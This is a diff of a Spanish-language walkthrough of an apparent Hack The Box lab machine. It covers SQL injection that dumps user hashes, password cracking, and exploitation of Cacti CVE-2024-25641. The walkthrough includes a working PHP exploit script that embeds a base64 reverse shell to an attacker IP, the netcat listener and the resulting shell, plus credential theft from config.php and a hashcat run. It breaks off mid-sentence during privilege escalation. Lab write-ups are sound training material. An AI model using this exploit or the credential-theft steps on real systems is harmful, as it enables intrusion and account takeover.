@@ -13,8 +13,12 @@ image: https://github.com/user-attachments/assets/17fc44c9-d486-4d62-aee3-3b1495
 
 * Web enumeration
 * Subdomain enumeration
-* SQL Injection password recovery panel
-* Cacti 1.2.26 Authentication Remote Command Execution
+* Blind Error SQL Injection (EXTRACTVALUE FUNCTION)
+* Abusing Cacti 1.2.26 Authentication Remote Command Execution (CVE-2024-25641)
+* Information Lekeage (config.php)
+* Cracking hashes (hashcat)
+* Chisel Remote Port Forwarding
+* Duplicati login bypass
 
 ## Enumeration
 
@@ -196,10 +200,402 @@ Comienzo enumerando las bases de datos existentes
 
 ![imagen](https://github.com/user-attachments/assets/19db35c4-d152-4507-9bb3-03d0288b74f6)
 
+Enumero las tablas de la base de datos monitorsthree_db, la tabla que me parece interesante es la de users
+
+![imagen](https://github.com/user-attachments/assets/8ffea493-ed29-40dc-9725-b4e3281348a3)
+
+![imagen](https://github.com/user-attachments/assets/58454fc3-3ed1-4b6a-8025-6f387d036420)
+
+Enumero las columnas de la tabla users, las columnas que me interesan son la de username y password
+
+![imagen](https://github.com/user-attachments/assets/11a8fe77-ad47-4d1b-997f-f789c245cd17)
+
+![imagen](https://github.com/user-attachments/assets/507a4391-af3b-4970-bded-6f199946a5c7)
+
+![imagen](https://github.com/user-attachments/assets/6505a287-6eda-4874-acb1-48dbe5b89a16)
+
+![imagen](https://github.com/user-attachments/assets/231e9616-2edc-4651-8f02-e4e9c6014560)
+
+Por ultimo obtengo los usuarios y sus contraseñas
+
+![imagen](https://github.com/user-attachments/assets/b708f29d-236b-4e0d-85dc-862b042f1051)
+
+![imagen](https://github.com/user-attachments/assets/1feb6853-00a5-4a91-81e6-bb4a8ea32055)
+
+![imagen](https://github.com/user-attachments/assets/d9ad3867-6478-4356-b680-91947d74412e)
+
+![imagen](https://github.com/user-attachments/assets/c880107b-d402-4ba4-a489-f7004c53d154)
+
+![imagen](https://github.com/user-attachments/assets/a5754b8e-5fa9-4771-882b-668c3156144e)
+
+![imagen](https://github.com/user-attachments/assets/ea93520d-a42f-426e-94d4-a2b492b39bc2)
+
+![imagen](https://github.com/user-attachments/assets/9a432525-cc62-4e05-92af-b70671755abb)
+
+![imagen](https://github.com/user-attachments/assets/2b5d72d3-dcfe-49ac-b43f-96d32a340252)
+
+![imagen](https://github.com/user-attachments/assets/40cf8ecf-072b-400f-a0fc-e7219811197d)
+
+![imagen](https://github.com/user-attachments/assets/658f497c-271a-459d-9816-ee4bc54eb18f)
+
+![imagen](https://github.com/user-attachments/assets/96a70d25-46f9-4ba7-aebf-39f5eed78402)
+
+![imagen](https://github.com/user-attachments/assets/80c9047f-ca66-4cc2-b0b9-db334ca4c296)
+
+![imagen](https://github.com/user-attachments/assets/c8d01e6e-23c2-4371-8a11-fea6e2205564)
+
+![imagen](https://github.com/user-attachments/assets/35bf181a-27b8-415c-b9cd-2fc2ba361fa7)
+
+![imagen](https://github.com/user-attachments/assets/f02ddf29-11ea-4b1c-a4dc-cd02c548bac7)
+
+![imagen](https://github.com/user-attachments/assets/8d311e7b-ed3d-4ddf-9542-bae0b78feabb)
+
+![imagen](https://github.com/user-attachments/assets/92ee881d-11fd-4227-a72a-ae9835baafa1)
+
+![imagen](https://github.com/user-attachments/assets/3bbb091a-6c51-4771-b640-28698753fba6)
+
+La información que he obtenido es la siguiente:
+
+```
+admin:31a181c8372e3afc59dab863430610e8
+dthompson:c585d01f2eb3e6e1073e92023088a3dd
+janderson:e68b6eb86b45f6d92f8f292428f77ac
+mwatson:b683cc128fe244b00f176c8a950f5
+```
+
+Utilizo hashes.com para intentar cracker las hashes, consigo obtener la contraseña del usuario admin, la cual es greencacti2001
+
+![imagen](https://github.com/user-attachments/assets/72044e52-4f84-4a1c-9b6d-466611ad7cfc)
+
 ### Abusing Cacti 1.2.26 Authenticated RCE Vulnerability (CVE-2024-25641)
 
 En GitHub encuentro un repositorio sobre la vulnerabilidad CVE-2024-25641 el cual me sirven de guía para realizar la explotación de forma manual y entender como funciona todo.
 
-* [CVE-2024-25641](https://github.com/Safarchand/CVE-2024-25641)
+* [CVE-2024-25641](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)
 
-![imagen](https://github.com/user-attachments/assets/d3447fc4-82cb-4615-ad3d-e0160445f5af)
+![imagen](https://github.com/user-attachments/assets/bb79a05a-1b53-4f9b-a7c5-0563fa1a4f5e)
+
+Una vez he iniciado sesión en cacti como el usuario admin me dirigo al apartado Import/Export y entro en Import Packages
+
+![imagen](https://github.com/user-attachments/assets/e256a6fb-bbf7-4d91-8179-ff4108e41560)
+
+Utilizo el payload proporcionado por el repositorio de GitHub, en este mismo modifico la variable $filedata donde introduzco una reverse shell en base64
+
+```php
+<?php
+$xmldata = "<xml>
+   <files>
+       <file>
+           <name>resource/shell.php</name>
+           <data>%s</data>
+           <filesignature>%s</filesignature>
+       </file>
+   </files>
+   <publickey>%s</publickey>
+   <signature></signature>
+</xml>";
+$filedata = "<?php system('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTQvNDQ0NCAwPiYxJwo= | base64 -d | bash'); ?>";
+$keypair = openssl_pkey_new();
+$public_key = openssl_pkey_get_details($keypair)["key"];
+openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
+$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
+openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
+file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
+system("cat test.xml | gzip -9 > test.xml.gz");
+?>
+```
+
+Ejecuto el archivo shell.php y obtengo el xml comprimido que debo de importar en cacti
+
+```bash
+php shell.php
+```
+
+Utilizo netcat para iniciar un listener por el puerto 4444 y obtener una reverse shell
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+Me dirigo al panel de cacti e importo test.xml.gz
+
+![imagen](https://github.com/user-attachments/assets/0c6c9f5a-4251-44d8-a1ce-bdbef8828377)
+
+Una vez importado me dirigo a /resource/shell.php y obtengo la reverse shell como el usuario www-data
+
+![imagen](https://github.com/user-attachments/assets/2c195783-e904-46a0-8695-d115b9a914a7)
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.194] from (UNKNOWN) [10.10.11.30] 54072
+bash: cannot set terminal process group (1148): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@monitorsthree:~/html/cacti/resource$ whoami
+www-data
+```
+
+## Post exploitation
+
+### User Pivoting
+
+Obtengo acceso al sistema como el usuario www-data, este es un usuario con bajo privilegios por lo que debo de buscar alguna manera de pivotar hacia otro usuario. Comenzaré visualizando cuales son los usuarios que existen en el sistema.
+
+```bash
+www-data@monitorsthree:~/html/cacti/resource$ grep sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+```
+
+Revisando los directorios encuentro en /var/www/html/cacti/include un archivo config.php el cual contiene credenciales de acceso a la base de datos
+
+```bash
+www-data@monitorsthree:~/html/cacti/include$ grep -i user /var/www/html/cacti/include/config.php
+ * Make sure these values reflect your actual database/host/user/password
+$database_username = 'cactiuser';
+$database_password = 'cactiuser';
+#$rdatabase_username = 'cactiuser';
+#$rdatabase_password = 'cactiuser';
+ *		'X-ProxyUser-Ip',
+```
+
+Me conecto a MySQL como cactiuser y obtengo la contraseña del usuario marcus
+
+```bash
+www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 2642
+Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+```
+
+```bash
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| cacti              |
+| information_schema |
+| mysql              |
++--------------------+
+3 rows in set (0.001 sec)
+```
+
+```bash
+MariaDB [(none)]> use cacti;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+```
+
+```bash
+MariaDB [cacti]> show tables;
++-------------------------------------+
+| Tables_in_cacti                     |
++-------------------------------------+
+| aggregate_graph_templates           |
+| aggregate_graph_templates_graph     |
+| aggregate_graph_templates_item      |
+| aggregate_graphs                    |
+| aggregate_graphs_graph_item         |
+| aggregate_graphs_items              |
+| automation_devices                  |
+| automation_graph_rule_items         |
+| automation_graph_rules              |
+| automation_ips                      |
+| automation_match_rule_items         |
+| automation_networks                 |
+| automation_processes                |
+| automation_snmp                     |
+| automation_snmp_items               |
+| automation_templates                |
+| automation_tree_rule_items          |
+| automation_tree_rules               |
+| cdef                                |
+| cdef_items                          |
+| color_template_items                |
+| color_templates                     |
+| colors                              |
+| data_debug                          |
+| data_input                          |
+| data_input_data                     |
+| data_input_fields                   |
+| data_local                          |
+| data_source_profiles                |
+| data_source_profiles_cf             |
+| data_source_profiles_rra            |
+| data_source_purge_action            |
+| data_source_purge_temp              |
+| data_source_stats_daily             |
+| data_source_stats_hourly            |
+| data_source_stats_hourly_cache      |
+| data_source_stats_hourly_last       |
+| data_source_stats_monthly           |
+| data_source_stats_weekly            |
+| data_source_stats_yearly            |
+| data_template                       |
+| data_template_data                  |
+| data_template_rrd                   |
+| external_links                      |
+| graph_local                         |
+| graph_template_input                |
+| graph_template_input_defs           |
+| graph_templates                     |
+| graph_templates_gprint              |
+| graph_templates_graph               |
+| graph_templates_item                |
+| graph_tree                          |
+| graph_tree_items                    |
+| host                                |
+| host_graph                          |
+| host_snmp_cache                     |
+| host_snmp_query                     |
+| host_template                       |
+| host_template_graph                 |
+| host_template_snmp_query            |
+| plugin_config                       |
+| plugin_db_changes                   |
+| plugin_hooks                        |
+| plugin_realms                       |
+| poller                              |
+| poller_command                      |
+| poller_data_template_field_mappings |
+| poller_item                         |
+| poller_output                       |
+| poller_output_boost                 |
+| poller_output_boost_local_data_ids  |
+| poller_output_boost_processes       |
+| poller_output_realtime              |
+| poller_reindex                      |
+| poller_resource_cache               |
+| poller_time                         |
+| processes                           |
+| reports                             |
+| reports_items                       |
+| rrdcheck                            |
+| sessions                            |
+| settings                            |
+| settings_tree                       |
+| settings_user                       |
+| settings_user_group                 |
+| sites                               |
+| snmp_query                          |
+| snmp_query_graph                    |
+| snmp_query_graph_rrd                |
+| snmp_query_graph_rrd_sv             |
+| snmp_query_graph_sv                 |
+| snmpagent_cache                     |
+| snmpagent_cache_notifications       |
+| snmpagent_cache_textual_conventions |
+| snmpagent_managers                  |
+| snmpagent_managers_notifications    |
+| snmpagent_mibs                      |
+| snmpagent_notifications_log         |
+| user_auth                           |
+| user_auth_cache                     |
+| user_auth_group                     |
+| user_auth_group_members             |
+| user_auth_group_perms               |
+| user_auth_group_realm               |
+| user_auth_perms                     |
+| user_auth_realm                     |
+| user_auth_row_cache                 |
+| user_domains                        |
+| user_domains_ldap                   |
+| user_log                            |
+| vdef                                |
+| vdef_items                          |
+| version                             |
++-------------------------------------+
+113 rows in set (0.001 sec)
+```
+
+```bash
+MariaDB [cacti]> describe user_auth;
++------------------------+-----------------------+------+-----+---------+----------------+
+| Field                  | Type                  | Null | Key | Default | Extra          |
++------------------------+-----------------------+------+-----+---------+----------------+
+| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
+| username               | varchar(50)           | NO   | MUL | 0       |                |
+| password               | varchar(256)          | NO   |     |         |                |
+| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
+| full_name              | varchar(100)          | YES  |     | 0       |                |
+| email_address          | varchar(128)          | YES  |     | NULL    |                |
+| must_change_password   | char(2)               | YES  |     | NULL    |                |
+| password_change        | char(2)               | YES  |     | on      |                |
+| show_tree              | char(2)               | YES  |     | on      |                |
+| show_list              | char(2)               | YES  |     | on      |                |
+| show_preview           | char(2)               | NO   |     | on      |                |
+| graph_settings         | char(2)               | YES  |     | NULL    |                |
+| login_opts             | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_graphs          | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_trees           | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_hosts           | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_graph_templates | tinyint(3) unsigned   | NO   |     | 1       |                |
+| enabled                | char(2)               | NO   | MUL | on      |                |
+| lastchange             | int(11)               | NO   |     | -1      |                |
+| lastlogin              | int(11)               | NO   |     | -1      |                |
+| password_history       | varchar(4096)         | NO   |     | -1      |                |
+| locked                 | varchar(3)            | NO   |     |         |                |
+| failed_attempts        | int(5)                | NO   |     | 0       |                |
+| lastfail               | int(10) unsigned      | NO   |     | 0       |                |
+| reset_perms            | int(10) unsigned      | NO   |     | 0       |                |
++------------------------+-----------------------+------+-----+---------+----------------+
+25 rows in set (0.002 sec)
+```
+
+```bash
+MariaDB [cacti]> select username,password from user_auth;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
+| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
+| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
++----------+--------------------------------------------------------------+
+3 rows in set (0.000 sec)
+```
+
+A simple vista observo que esta hasheado en bcrypt, utilizo hashcat para crackearlo y obtener la contraseña de marcus, la cual es 12345678910
+
+```bash
+hashcat -m 3200 -a 0 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt
+$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
+```
+
+Intento migrar el usuario marcus con la contraseña obtenida, puediendo obtener acceso de manera existosa
+
+```bash
+
+```
+
+### Privilege escalation
+
+Utilizo el comando netstat para mostrar información sobre las conexiones de red y puertos en uso
+
+```bash
+marcus@monitorsthree:~$ netstat -tulpen
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          32512      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34916      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        29226      -                   
+tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      0          37203      -                   
+tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      33         35167      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        35017      -                   
+tcp        0      0 127.0.0.1:36077         0.0.0.0:*               LISTEN      0          32581      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      0          32518      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      0          34918      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        29225      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          33226      -  
+```
+
+Visualizo que se encuentra el puerto 8200 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo 
